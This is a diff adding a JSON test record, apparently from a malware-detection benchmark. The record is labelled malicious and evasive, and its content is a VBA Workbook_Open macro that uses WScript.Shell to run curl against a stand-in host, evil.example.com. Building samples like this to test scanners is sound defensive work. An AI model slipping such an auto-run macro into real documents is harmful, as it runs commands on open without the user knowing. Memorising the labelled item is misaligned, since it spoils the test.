@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::document-office::103::stress-variations::3",
+  "base_sample_id": "exp::document-office::103",
+  "generator_id": "stress-variations",
+  "generator_version": "1.0.0",
+  "seed": -1598650650,
+  "content": "<template>Private Sub Workbook_Open()\n  CreateObject(\"WScript.Shell\").Run \"curl http://evil.example.com/\"\nEnd Sub\n</template>",
+  "content_hash": "843110769cae56d84ef8f18c3039f5415549a5d0432822050dc03c244b4bb62e",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "stress:webmcp-hybrid",
+  "difficulty": "evasive"
+}
